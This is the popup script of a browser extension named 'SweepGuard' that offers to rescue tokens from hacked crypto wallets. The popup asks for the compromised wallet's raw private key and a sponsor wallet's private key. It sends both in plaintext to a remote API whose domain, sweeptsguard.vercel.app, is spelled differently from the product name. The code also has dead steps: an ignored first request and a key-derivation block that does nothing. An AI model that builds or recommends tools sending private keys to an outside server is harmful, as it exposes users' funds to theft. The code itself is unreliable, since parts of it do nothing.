// SweepGuard Extension — Fund Rescue Popup
// Handles: Preview → Claim → Result

const API_BASE = 'https://sweeptsguard.vercel.app'

// ── Visibility Toggle ─────────────────────────────────────────────────
function toggleVisibility(inputId, btn) {
  const input = document.getElementById(inputId)
  if (input.type === 'password') {
    input.type = 'text'
    btn.textContent = '🔒'
  } else {
    input.type = 'password'
    btn.textContent = '👁️'
  }
}

// ── Step Navigation ───────────────────────────────────────────────────
function setStep(n) {
  document.getElementById('step1').className = n >= 1 ? 'step active' : 'step'
  document.getElementById('step2').className = n >= 2 ? 'step active' : 'step'
  document.getElementById('step3').className = n >= 3 ? 'step active' : 'step'
}

function showSection(id) {
  ['setup-section', 'preview-section', 'result-section'].forEach(s => {
    document.getElementById(s).className = 'hidden'
  })
  document.getElementById(id).className = ''
}

function goBack() {
  showSection('setup-section')
  setStep(1)
}

function resetAll() {
  document.getElementById('privateKey').value = ''
  document.getElementById('safeWallet').value = ''
  document.getElementById('sponsorKey').value = ''
  document.getElementById('contractAddress').value = ''
  document.getElementById('tokenAmount').value = ''
  document.getElementById('claimData').value = ''
  document.getElementById('merkleProof').value = ''
  document.getElementById('chainSelect').value = ''
  showSection('setup-section')
  setStep(1)
}

// ── Load Saved Values ─────────────────────────────────────────────────
chrome.storage.local.get(['rescueConfig'], (result) => {
  const config = result.rescueConfig || {}
  if (config.safeWallet) document.getElementById('safeWallet').value = config.safeWallet
  if (config.chainId) document.getElementById('chainSelect').value = config.chainId
  if (config.contractAddress) document.getElementById('contractAddress').value = config.contractAddress
})

// ── Preview Claim ─────────────────────────────────────────────────────
async function previewClaim() {
  const privateKey = document.getElementById('privateKey').value.trim()
  const safeWallet = document.getElementById('safeWallet').value.trim()
  const sponsorKey = document.getElementById('sponsorKey').value.trim()
  const chainId = parseInt(document.getElementById('chainSelect').value)
  const contractAddress = document.getElementById('contractAddress').value.trim()
  const tokenAmount = document.getElementById('tokenAmount').value.trim()
  const claimData = document.getElementById('claimData').value.trim()
  const merkleProof = document.getElementById('merkleProof').value.trim()

  // Validate
  if (!privateKey || !safeWallet || !sponsorKey || !chainId || !contractAddress) {
    alert('Please fill in all required fields')
    return
  }
  if (!privateKey.startsWith('0x') || privateKey.length < 64) {
    alert('Invalid private key format')
    return
  }
  if (!safeWallet.startsWith('0x') || safeWallet.length !== 42) {
    alert('Invalid safe wallet address')
    return
  }
  if (!sponsorKey.startsWith('0x') || sponsorKey.length < 64) {
    alert('Invalid sponsor private key')
    return
  }
  if (!contractAddress.startsWith('0x') || contractAddress.length !== 42) {
    alert('Invalid contract address')
    return
  }

  // Save config
  chrome.storage.local.set({ rescueConfig: { safeWallet, chainId, contractAddress } })

  // Derive wallet address from private key
  let walletAddress
  try {
    // Use ethers if available, otherwise derive manually
    const pkBytes = hexToBytes(privateKey.slice(2))
    // Simple secp256k1 public key derivation would be complex
    // We'll let the API derive it from the private key
    walletAddress = null // Will be set by API
  } catch {
    walletAddress = null
  }

  showSection('preview-section')
  setStep(2)
  document.getElementById('preview-loading').className = ''
  document.getElementById('preview-content').className = 'hidden'
  document.getElementById('preview-error').className = 'hidden'

  try {
    // First, derive the wallet address
    const deriveRes = await fetch(`${API_BASE}/api/airdrop/claim`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'preview',
        contractAddress,
        chainId,
        safeWallet,
        walletAddress: safeWallet, // placeholder, will be overridden
        sponsorAddress: null,
        claimData: claimData || undefined,
        merkleProof: merkleProof || undefined,
        tokenAmount: tokenAmount || undefined,
      }),
    })

    // Now do the real preview with derived address
    // We need to derive the address from the private key
    // For now, ask the user for the hacked wallet address
    const hackedAddress = prompt('Enter the HACKED wallet address (0x...):')
    if (!hackedAddress || !hackedAddress.startsWith('0x')) {
      document.getElementById('preview-loading').className = 'hidden'
      document.getElementById('preview-error').className = ''
      document.getElementById('error-message').textContent = 'Hacked wallet address required'
      return
    }

    const response = await fetch(`${API_BASE}/api/airdrop/claim`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'preview',
        contractAddress,
        chainId,
        safeWallet,
        walletAddress: hackedAddress,
        sponsorPrivateKey: sponsorKey,
        claimData: claimData || undefined,
        merkleProof: merkleProof || undefined,
        tokenAmount: tokenAmount || undefined,
      }),
    })

    const data = await response.json()
    document.getElementById('preview-loading').className = 'hidden'

    if (!response.ok || data.error) {
      document.getElementById('preview-error').className = ''
      document.getElementById('error-message').textContent = data.error || 'Preview failed'
      if (data.contractWarnings?.length) {
        document.getElementById('error-message').textContent += '\n\n' + data.contractWarnings.join('\n')
      }
      return
    }

    // Show preview
    document.getElementById('preview-content').className = ''

    // Token info
    document.getElementById('token-name').textContent = `${data.tokenSymbol} (${data.tokenAddress?.slice(0, 10)}...)`
    document.getElementById('claimable-amount').textContent = `${data.claimableAmount} ${data.tokenSymbol}`
    document.getElementById('fee-amount').textContent = `${data.platformFeeAmount} ${data.tokenSymbol}`
    document.getElementById('safe-amount').textContent = `${data.safeWalletAmount} ${data.tokenSymbol}`

    // Eligibility
    const badge = document.getElementById('eligible-badge')
    if (data.alreadyClaimed) {
      badge.className = 'badge badge-red'
      badge.textContent = '❌ Already Claimed'
    } else if (data.eligible === true) {
      badge.className = 'badge badge-green'
      badge.textContent = '✅ Eligible'
    } else if (data.eligible === null) {
      badge.className = 'badge badge-yellow'
      badge.textContent = '⚠️ Unknown'
    } else {
      badge.className = 'badge badge-red'
      badge.textContent = '❌ Not Eligible'
    }

    // Sponsor gas
    document.getElementById('sponsor-balance').textContent = `${data.sponsorBalance} ${data.sponsorGasToken}`
    document.getElementById('gas-cost').textContent = `~${data.estimatedGasCost} ${data.sponsorGasToken}`
    const gasBadge = document.getElementById('gas-badge')
    if (data.sponsorHasGas) {
      gasBadge.className = 'badge badge-green'
      gasBadge.textContent = '✅ Sufficient'
    } else {
      gasBadge.className = 'badge badge-red'
      gasBadge.textContent = '❌ Insufficient'
    }

    // Execution info
    const execInfo = document.getElementById('execution-info')
    execInfo.textContent = data.executionDescription
    execInfo.className = `info-box ${data.riskLevel === 'high' ? 'warning' : 'info'}`

    // Contract warnings
    const warningsDiv = document.getElementById('contract-warnings')
    warningsDiv.innerHTML = ''
    if (data.contractWarnings?.length) {
      data.contractWarnings.forEach(w => {
        const div = document.createElement('div')
        div.className = 'info-box warning'
        div.textContent = w
        warningsDiv.appendChild(div)
      })
    }
    if (data.eligibilityWarning) {
      const div = document.createElement('div')
      div.className = 'info-box warning'
      div.textContent = data.eligibilityWarning
      warningsDiv.appendChild(div)
    }

    // Enable/disable claim button
    const claimBtn = document.getElementById('claimBtn')
    if (data.alreadyClaimed || data.eligible === false) {
      claimBtn.disabled = true
      claimBtn.textContent = '❌ Cannot Claim'
    } else if (!data.sponsorHasGas) {
      claimBtn.disabled = true
      claimBtn.textContent = '❌ Insufficient Gas'
    } else {
      claimBtn.disabled = false
      claimBtn.textContent = '🚀 Rescue Funds'
    }

    // Store preview data for claim
    window._previewData = {
      contractAddress,
      chainId,
      safeWallet,
      walletAddress: hackedAddress,
      privateKey,
      sponsorKey,
      claimableRaw: data.claimableRaw,
      tokenAddress: data.tokenAddress,
      claimData: claimData || undefined,
      merkleProof: merkleProof || undefined,
    }

  } catch (err) {
    document.getElementById('preview-loading').className = 'hidden'
    document.getElementById('preview-error').className = ''
    document.getElementById('error-message').textContent = `Network error: ${err.message}`
  }
}

// ── Execute Claim ─────────────────────────────────────────────────────
async function executeClaim() {
  const pd = window._previewData
  if (!pd) {
    alert('No preview data — please preview first')
    return
  }

  showSection('result-section')
  setStep(3)
  document.getElementById('result-loading').className = ''
  document.getElementById('result-success').className = 'hidden'
  document.getElementById('result-error').className = 'hidden'

  try {
    const response = await fetch(`${API_BASE}/api/airdrop/claim`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'claim',
        contractAddress: pd.contractAddress,
        chainId: pd.chainId,
        safeWallet: pd.safeWallet,
        walletAddress: pd.walletAddress,
        privateKey: pd.privateKey,
        sponsorPrivateKey: pd.sponsorKey,
        claimableRaw: pd.claimableRaw,
        tokenAddress: pd.tokenAddress,
        claimData: pd.claimData,
        merkleProof: pd.merkleProof,
      }),
    })

    const data = await response.json()
    document.getElementById('result-loading').className = 'hidden'

    if (!response.ok || data.error) {
      document.getElementById('result-error').className = ''
      document.getElementById('result-error-msg').textContent = data.error || 'Claim failed'
      return
    }

    // Success!
    document.getElementById('result-success').className = ''
    document.getElementById('fund-tx').textContent = data.fundTxHash || data.bundleHash || '—'
    document.getElementById('claim-tx').textContent = data.claimTxHash || '—'
    document.getElementById('block-num').textContent = data.blockNumber || '—'
    document.getElementById('exec-method').textContent = data.executionMethod || '—'

  } catch (err) {
    document.getElementById('result-loading').className = 'hidden'
    document.getElementById('result-error').className = ''
    document.getElementById('result-error-msg').textContent = `Network error: ${err.message}`
  }
}

// ── Helper ────────────────────────────────────────────────────────────
function hexToBytes(hex) {
  const bytes = []
  for (let i = 0; i < hex.length; i += 2) {
    bytes.push(parseInt(hex.substr(i, 2), 16))
  }
  return new Uint8Array(bytes)
}
